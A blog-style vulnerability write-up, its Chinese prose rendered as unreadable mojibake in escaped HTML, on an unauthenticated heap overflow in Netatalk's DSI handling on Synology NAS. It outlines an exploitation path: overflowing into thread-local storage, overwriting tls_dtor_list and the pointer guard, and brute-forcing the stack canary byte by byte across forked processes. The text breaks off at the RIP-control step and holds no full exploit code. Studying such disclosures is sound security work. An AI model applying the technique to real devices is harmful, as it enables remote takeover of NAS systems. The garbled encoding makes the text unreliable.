&lt;p&gt;Apple Filing Protocol (AFP) æ˜¯å€‹é¡ä¼¼ SMB çš„æª”æ¡ˆå‚³è¼¸å”å®šï¼Œæä¾› Mac ä¾†å‚³è¼¸åŠåˆ†äº«æª”æ¡ˆï¼Œå›  Apple æœ¬èº«ä¸¦æ²’æœ‰é–‹æºï¼Œç‚ºäº†è®“ Unlx like çš„ç³»çµ±ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ–¼æ˜¯èª•ç”Ÿäº† Netatalkï¼ŒNetatalk æ˜¯å€‹å¯¦ä½œ Mac çš„ AFP å”å®šçš„ OpenSource å°ˆæ¡ˆï¼Œç‚ºäº†è®“ Mac å¯ä»¥æ›´æ–¹ä¾¿çš„ç”¨ NAS ä¾†åˆ†äº«æª”æ¡ˆï¼Œå¹¾ä¹æ¯ä¸€å» ç‰Œçš„ NAS éƒ½æœƒä½¿ç”¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;
&lt;p&gt;Synology ä¸­çš„ netatalk æ˜¯é è¨­é–‹å•Ÿï¼Œç‰ˆæœ¬æ˜¯æ”¹è‡ª 3.1.8 çš„ netatalkï¼Œä¸¦ä¸”æœ‰åœ¨å®šæœŸè¿½è¹¤å®‰å…¨æ€§æ›´æ–°ï¼Œåªè¦å‰›è£å¥½å°±å¯ä»¥ç”¨ afp å”å®šä¾†èˆ‡ Synology NAS åˆ†äº«æª”æ¡ˆï¼Œè€Œ binary æœ¬èº«ä¿è­·æœ‰ ASLR/NX/StackGuardã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;

&lt;p&gt;è¬›æ¼æ´ä¹‹å‰ï¼Œå…ˆå¸¶å¤§å®¶ä¾†çœ‹ä¸€ä¸‹ netatalk ä¸­ï¼Œéƒ¨åˆ†é‡è¦çµæ§‹ï¼Œé¦–å…ˆæ˜¯ DSIï¼ŒNetatalk åœ¨é€£ç·šæ™‚æ˜¯ä½¿ç”¨çš„ DSI (Data Stream interface) ä¾†å‚³éè³‡è¨Šï¼ŒServer è·Ÿ Client éƒ½æ˜¯é€šé DSI é€™å€‹å”å®šä¾†æºé€šï¼Œæ¯å€‹ connection çš„ packet éƒ½æœƒæœ‰ DSI çš„ header åœ¨ packet å‰é¢&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DSI å°åŒ…ä¸­å…§å®¹å¤§è‡´ä¸Šæœƒå¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œæœƒæœ‰ Flag/Command ç­‰ç­‰ metadata ä»¥åŠ payload é€šå¸¸å°±æœƒæ˜¯ä¸€å€‹ DSI Header + payload çš„çµæ§‹&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afp å”å®šçš„é€šè¨Šéç¨‹å¤§æ¦‚å¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œä½¿ç”¨ AFP æ™‚ï¼Œclient æœƒå…ˆå»æ‹¿ server è³‡è¨Šï¼Œä¾†ç¢ºå®šæœ‰å“ªäº›èªè­‰çš„æ–¹å¼é‚„æœ‰ä½¿ç”¨çš„ç‰ˆæœ¬ç­‰ç­‰è³‡è¨Šï¼Œé€™å€‹éƒ¨åˆ†å¯ä»¥ä¸åšï¼Œç„¶å¾Œæœƒå» Open Session ä¾†ï¼Œé–‹å•Ÿæ–°çš„ Sessionï¼Œæ¥è‘—å°±å¯ä»¥åŸ·è¡Œ AFP çš„ command ï¼Œä½†åœ¨æœªèªè­‰ä¹‹å‰ï¼Œåªå¯ä»¥åšç™»å…¥è·Ÿç™»å‡ºç­‰ç›¸é—œæ“ä½œï¼Œæˆ‘å€‘å¿…é ˆç”¨ login å»é©—è­‰ä½¿ç”¨è€…èº«ä»½ï¼Œåªè¦æ¬Šé™æ²’å•é¡Œæ¥ä¸‹ä¾†å°±å¯åƒ SMB ä¸€æ¨£åšæª”æ¡ˆæ“ä½œ&lt;/p&gt;

&lt;p&gt;åœ¨ Netatalk å¯¦ä½œä¸­ï¼Œæœƒç”¨ dsi_block ä½œç‚ºå°åŒ…çš„çµæ§‹&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag å°±æ˜¯æŒ‡è©² packet æ˜¯ request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command è¡¨ç¤ºæˆ‘å€‘çš„ request è¦åšçš„äº‹æƒ…
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ netatalk ä¸­ï¼Œé™¤äº†åŸå§‹å°åŒ…çµæ§‹å¤–ï¼Œä¹Ÿæœƒå°‡å°åŒ…åŠè¨­å®šæª” parse å®Œå¾Œï¼Œå°‡å¤§éƒ¨åˆ†çš„è³‡è¨Šï¼Œå­˜æ”¾åˆ°å¦å¤–ä¸€å€‹åç‚º DSI çµæ§‹ä¸­ï¼Œä¾‹å¦‚ server_quantum åŠ payload å…§å®¹ç­‰ï¼Œä»¥ä¾¿å¾ŒçºŒçš„æ“ä½œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œå°åŒ…ä¸­çš„ Payload æœƒå­˜æ”¾åœ¨ DSI ä¸­ command çš„ buffer ä¸­ï¼Œè©² buffer å¤§å°ï¼Œå–è‡ªæ–¼ server_quantumï¼Œè©²æ•¸å€¼å‰‡æ˜¯å–è‡ªæ–¼ afp çš„è¨­å®šæª” afp.conf ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœæ²’ç‰¹åˆ¥è¨­å®šï¼Œå‰‡æœƒå–ç”¨ default å¤§å° 0x100000ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰äº†åˆæ­¥äº†è§£å¾Œï¼Œæˆ‘å€‘å¯ä»¥è¬›è¬›æ¼æ´ã€‚&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ç™¼ç¾çš„æ¼æ´å°±ç™¼ç”Ÿåœ¨ï¼ŒåŸ·è¡Œ dsi command æ™‚ï¼Œè®€å– payload å…§å®¹ç™¼ç”Ÿäº† overflowï¼Œæ­¤æ™‚ä¸¦ä¸éœ€ç™»å…¥å°±å¯ä»¥è§¸ç™¼ã€‚å•é¡Œå‡½å¼æ˜¯åœ¨ dsi_stream_receive&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹å°‡æ¥æ”¶åˆ°å°åŒ…çš„è³‡è¨Š parse å¾Œæ”¾åˆ° DSI çµæ§‹çš„ functionï¼Œé€™å€‹ function æ¥æ”¶å°åŒ…è³‡æ–™æ™‚ï¼Œæœƒå…ˆæ ¹æ“š header ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; ä¾†æ±ºå®šè¦è®€å¤šå°‘è³‡æ–™åˆ° command buffer ä¸­ï¼Œè€Œä¸€é–‹å§‹æœ‰é©—è­‰&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; ä¸å¯è¶…é server quantum ä¹Ÿå°±æ˜¯ command buffer å¤§å°ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œå¦‚ä¸Šåœ–é»ƒåŒ¡è™•ï¼Œå¦‚æœæœ‰çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; ï¼Œå‰‡æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; ä½œç‚º cmdlen å¤§å°ï¼Œä½†é€™é‚Šå»æ²’å»æª¢æŸ¥æ˜¯å¦æœ‰è¶…é command bufferã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½¿å¾— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_strem_read&lt;/code&gt; ä»¥é€™å€‹å¤§å°ä¾†è®€å– paylaod åˆ° command buffer ä¸­ï¼Œæ­¤æ™‚ command buffer å¤§å°ç‚º 0x100000ï¼Œå¦‚æœ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; å¤§å°è¶…é 0x100000 å°±æœƒç™¼ç”Ÿ heap overflowã€‚&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;ç”±æ–¼æ˜¯ heap overflowï¼Œæ‰€ä»¥æˆ‘å€‘é€™é‚Šå¿…é ˆå…ˆç†è§£ heap ä¸Šæœ‰ä»€éº¼æ±è¥¿å¯ä»¥åˆ©ç”¨ï¼Œåœ¨ DSM ä¸­çš„ Netatalk æ‰€ä½¿ç”¨çš„ Memory Allocator æ˜¯ glibc 2.20ï¼Œè€Œåœ¨ glibc ä¸­ï¼Œç•¶ malloc å¤§å°è¶…é 0x20000 æ™‚ï¼Œå°±æœƒä½¿ç”¨ mmap ä¾†åˆ†é…è¨˜æ†¶é«”ç©ºé–“ï¼Œè€Œæˆ‘å€‘åœ¨ netatalk æ‰€ä½¿ç”¨çš„å¤§å°å‰‡æ˜¯ 0x100000 è¶…é 0x20000 å› æ­¤æœƒç”¨ mmap ä¾†åˆ†é…æˆ‘å€‘çš„ command bufferã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› ç‚ºæ˜¯ä»¥ mmap åˆ†é…çš„é—œä¿‚ï¼Œæœ€å¾Œåˆ†é…å‡ºä¾†çš„ç©ºé–“å‰‡æœƒåœ¨ Thread Local Storage å€æ®µä¸Šé¢ï¼Œè€Œä¸æ˜¯åœ¨æ­£å¸¸çš„ heap segment ä¸Šï¼Œå¦‚ä¸Šåœ–çš„ç´…æ¡†è™•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afpd çš„ memory layout å¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œä¸Šè¿°ç´…æ¡†é‚£å¡Šå°±æ˜¯ï¼Œç´…è‰²+æ©˜è‰²é€™å€æ®µï¼Œåœ¨ command buffer ä¸‹æ–¹çš„æ˜¯ Thread-local Storageã€‚&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage(TLS) æ˜¯ç”¨ä¾†å­˜æ”¾ thread çš„å€åŸŸè®Šæ•¸ï¼Œæ¯å€‹ thread éƒ½æœƒæœ‰è‡ªå·±çš„ TLSï¼Œåœ¨ Thread å»ºç«‹æ™‚å°±æœƒåˆ†é…ï¼Œç•¶ Thread çµæŸçš„æ™‚å€™å°±æœƒé‡‹æ”¾ï¼Œè€Œ main thread çš„ TLS å‰‡æœƒåœ¨ Process å»ºç«‹æ™‚å°±æœƒåˆ†é…ï¼Œå¦‚å‰é¢åœ–ç‰‡ä¸­çš„æ©˜è‰²å€æ®µï¼Œå› æ­¤æˆ‘å€‘å¯åˆ©ç”¨ heap overflow çš„æ¼æ´ä¾†è¦†è“‹æ‰å¤§éƒ¨åˆ†å­˜æ”¾åœ¨ TLS ä¸Šçš„è®Šæ•¸ã€‚&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;äº‹å¯¦ä¸Šä¾†èªª TLS å¯æ§åˆ¶ RIP çš„è®Šæ•¸æœ‰ä¸å°‘ï¼Œé€™é‚Šæå‡ºå¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç¬¬ä¸€å€‹æ˜¯ main arenaï¼Œä¸»è¦æ˜¯ glibc è¨˜æ†¶é«”ç®¡ç†å€‹çµæ§‹ï¼Œæ”¹ main arena å¯ä»¥è®“è¨˜æ†¶é«”åˆ†é…åˆ°ä»»æ„è¨˜æ†¶é«”ä½ç½®ï¼Œåšä»»æ„å¯«å…¥ï¼Œä½†æ§‹é€ ä¸Šæ¯”è¼ƒéº»ç…©ã€‚&lt;/li&gt;
  &lt;li&gt;ç¬¬äºŒå€‹æ˜¯ pointer guard å¯è—‰ç”±ä¿®æ”¹ pointer guard ä¾†æ”¹è®ŠåŸæœ¬å‘¼å«çš„ function pointer ï¼Œä½†é€™é‚Šéœ€è¦å…ˆæœ‰ leak è·ŸçŸ¥é“åŸæœ¬ pointer guard çš„å€¼æ‰èƒ½é”æˆ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¬¬ä¸‰å€‹å‰‡æ˜¯æ”¹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ï¼Œä¸é ˆ leak æ¯”è¼ƒç¬¦åˆæˆ‘å€‘ç¾åœ¨çš„ç‹€æ³&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;é€™æŠ€å·§æ˜¯ç”± project zero åœ¨ 2014 æ‰€æå‡ºçš„&lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;æ–¹æ³•&lt;/a&gt;ï¼Œè¦†è“‹ TLS ä¸Šçš„ tls_dtor_list ä¾†åšåˆ©ç”¨ï¼Œè—‰ç”±è¦†è“‹è©²è®Šæ•¸å¯åœ¨ç¨‹å¼çµæŸæ™‚æ§åˆ¶ç¨‹å¼æµç¨‹ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™é‚Šå°±ç¨å¾®æä¸€ä¸‹é€™å€‹æ–¹æ³•ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; æ˜¯å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; object çš„ singly linked list ä¸»è¦æ˜¯å­˜æ”¾ thread local storage çš„ destructorï¼Œåœ¨ thread çµæŸæ™‚æœƒå»çœ‹é€™å€‹ linked list ä¸¦å»å‘¼å« destructor functionï¼Œæˆ‘å€‘å¯è—‰ç”±è¦†è“‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; æŒ‡å‘æˆ‘å€‘æ‰€æ§‹é€ çš„ dtor_listã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œç•¶ç¨‹å¼çµæŸå‘¼å« exit() æ™‚ï¼Œæœƒå»å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt; ï¼Œè©² function æœƒå»å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ä¸­çš„ object ä¸¦å»å‘¼å«æ¯å€‹ destructorï¼Œæ­¤æ™‚å¦‚æœæˆ‘å€‘å¯ä»¥æ§åˆ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; å°±æœƒå»ä½¿ç”¨æˆ‘å€‘æ‰€æ§‹é€ çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; ä¾†å‘¼å«æˆ‘å€‘æŒ‡å®šçš„å‡½å¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æ–°ç‰ˆæœ¬å’Œ synology çš„ libc ä¸­ï¼Œdtor_list çš„ function pointer æœ‰è¢« pointer guard ä¿è­·ï¼Œå°è‡´æ­£å¸¸æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘ä¸¦ä¸å¥½åˆ©ç”¨ï¼Œä¸€æ¨£éœ€è¦å…ˆ leak å‡º pointer guard æ‰èƒ½å¥½å¥½æ§åˆ¶ rip åˆ°æˆ‘å€‘æƒ³è¦çš„ä½ç½®ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;ä½†æœ‰è¶£çš„æ˜¯ pointer guard ä¹Ÿæœƒåœ¨ TLS ä¸Šï¼Œä»–æœƒå­˜åœ¨  TLS ä¸­çš„ tcbhead_t çµæ§‹ä¸­ï¼Œå¦‚æœæˆ‘å€‘ overflow å¤ å¤šï¼Œä¹Ÿå¯ä»¥åœ¨ overflow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; çš„åŒæ™‚ï¼Œä¹Ÿå°‡ pointer guard ä¹Ÿä¸€ä½µæ¸…æ‰ï¼Œé€™æ¨£å°±å¯ä»¥è®“æˆ‘å€‘ä¸ç”¨è™•ç† pointer guard å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å…ˆä¾†è¬›è¬› tcbhead_t é€™çµæ§‹ï¼Œé€™å€‹çµæ§‹ä¸»è¦æ˜¯ Thread Control Block (TCB)ï¼Œæœ‰é»é¡ä¼¼ Windows ä¸­çš„ TEB çµæ§‹ æ˜¯ thread çš„ descriptorï¼Œä¸»è¦æœƒç”¨ä¾†å­˜æ”¾ thread çš„å„ç¨®è³‡è¨Šï¼Œè€Œåœ¨ x86_64 çš„ Linux æ¶æ§‹çš„ usermode ä¸‹ï¼Œfs æš«å­˜å™¨æœƒæŒ‡å‘é€™ä½ç½®ï¼Œæ¯ç•¶æˆ‘å€‘è¦å­˜å– thread local variable æ™‚ï¼Œéƒ½æœƒé€é fs æš«å­˜å™¨å» å­˜å–ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ° TCB çµæ§‹æœƒæœ‰ stack guard åŠ pointer guard ç­‰è³‡è¨Šï¼Œä¹Ÿå°±æ˜¯èªªç•¶æˆ‘å€‘åœ¨æ‹¿ pointer guard æ™‚ï¼Œä¹Ÿæ˜¯ç”¨ fs æš«å­˜å™¨å¾é€™å€‹çµæ§‹å–å‡ºçš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å›é ­çœ‹ä¸€ä¸‹ TLS ä¸Šçš„çµæ§‹åˆ†ä½ˆï¼Œå¯ä»¥çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; å¾Œæ–¹å°±æ˜¯é€™å€‹ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; çµæ§‹ã€‚åªè¦æˆ‘å€‘ overflow å¤ å¤šå°±å¯ä»¥è“‹æ‰ pointer guardï¼Œç„¶è€Œæ­¤æ™‚æœƒå‡ºç¾å¦å¤–ä¸€å€‹å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› ç‚º stack guard åœ¨ pointer guard å‰ï¼Œç•¶æˆ‘å€‘è“‹æ‰ pointer guard çš„åŒæ™‚ï¼Œä¹Ÿæœƒè“‹æ‰ stack guardã€‚é‚£éº¼è“‹æ‰ stack guard æœƒæœ‰ä»€éº¼å½±éŸ¿å‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨æˆ‘å€‘å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; æ™‚ï¼Œå› ç‚ºæœ‰é–‹å•Ÿ stack guard ä¿è­·çš„é—œä¿‚ï¼Œæœƒå…ˆå¾ TLS ä¸Šï¼Œå–å¾— stack guard æ”¾åœ¨ stack ä¸Šï¼Œç­‰åˆ°æˆ‘å€‘å‘¼å« dsi_stream_read å» trigger overflow ä¸”è“‹æ‰ pointer guard åŠ stack guard å¾Œï¼Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; è¿”å›æ™‚ï¼Œæœƒå»æª¢æŸ¥ stack guard æ˜¯å¦èˆ‡ TLS ä¸­çš„ç›¸åŒï¼Œä½†å› ç‚ºé€™æ™‚å€™çš„ TLS çš„ stack guard å·²ç¶“è¢«æˆ‘å€‘è“‹æ‰äº†ï¼Œå°è‡´æª¢æŸ¥ä¸é€šéè€Œä¸­æ­¢ç¨‹å¼ï¼Œå°±æœƒé€ æˆæˆ‘å€‘ç„¡æ³•åˆ©ç”¨é€™å€‹æŠ€å·§ä¾†é”æˆ RCEã€‚&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ netatalk(afpd) çš„æ¶æ§‹ä¸­ï¼Œäº‹å¯¦ä¸Šæ¯æ¬¡é€£ç·šéƒ½æœƒ fork ä¸€å€‹æ–°çš„ process ä¾† handle ä½¿ç”¨è€…çš„ requestï¼Œè€Œ Linux ä¸­çš„ process æœ‰å€‹ç‰¹æ€§æ˜¯ fork å‡ºä¾†çš„ processï¼Œmemory address åŠ stack gurad ç­‰éƒ½æœƒèˆ‡åŸå…ˆçš„ parent process ç›¸åŒï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥åˆ©ç”¨ CTF å¸¸è¦‹çš„æ‹›å¼ï¼Œä¸€å€‹ byte ä¸€å€‹ bytes  brute-force çš„æ–¹å¼ä¾†ç²å¾— stack guard ã€‚&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

&lt;p&gt;åŸºæœ¬æ¦‚å¿µæ˜¯ åœ¨ overflow ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥åªè“‹ TLS ä¸­çš„ stack guard æœ€å°¾ç«¯ä¸€å€‹ byte ï¼Œæ¯æ¬¡é€£ç·šéƒ½è“‹ä¸åŒçš„ byteï¼Œä¸€æ—¦èˆ‡ stack guard ä¸åŒï¼Œå°±æœƒå› ç‚º abort è€Œä¸­æ–·é€£ç·šï¼Œæˆ‘å€‘å¯ä¾æ“šé€£ç·šçš„ä¸­æ–·èˆ‡å¦ï¼Œåˆ¤æ–·æˆ‘å€‘æ‰€è¦†è“‹çš„æ•¸å€¼æ˜¯å¦èˆ‡ stack guard ç›¸åŒã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä»¥ä¸Šåœ–ä¾†èªªï¼Œæˆ‘å€‘å‡è¨­ stack guard æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;ï¼Œç”±æ–¼ stack guard ç‰¹æ€§ï¼Œæœ€ä½ä¸€å€‹ byte ä¸€å®šæœƒæ˜¯ 0 ï¼Œé€™é‚Šå¾ç¬¬äºŒå€‹ byte è“‹èµ·ï¼Œé€™é‚Šå¯ä»¥å…ˆè“‹ 00 è©¦çœ‹çœ‹é€£ç·šæ˜¯å¦è¢«ä¸­æ–·ï¼Œå¦‚æœè¢«ä¸­æ–·ä»£è¡¨è“‹çš„æ•¸å€¼æ˜¯éŒ¯çš„ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°±æ¸¬å…¶ä»–æ•¸å€¼çœ‹çœ‹æœ‰æ²’æœ‰ä¸­æ–·ï¼Œä¾æ­¤é¡æ¨ï¼Œæ¸¬åˆ° 0xbc ç™¼ç¾æ²’æœ‰ä¸­æ–·ï¼Œä»£è¡¨ç¬¬äºŒå€‹ byte æ˜¯ 0xbcï¼Œæ¥ä¸‹ä¾†å°±ç¹¼çºŒè“‹ç¬¬ä¸‰ byte ï¼Œä¸€æ¨£å¾ 0x00 è“‹åˆ°æ²’ä¸­æ–·ï¼Œç›´åˆ°è“‹æ»¿ 8 bytes çš„ stack guard éƒ½æ²’ä¸­æ–·é€£ç·šå¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥çŸ¥é“ stack guard çš„å€¼æ˜¯ä»€éº¼ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°±å¯ä»¥è§£æ±º stack guard å•é¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

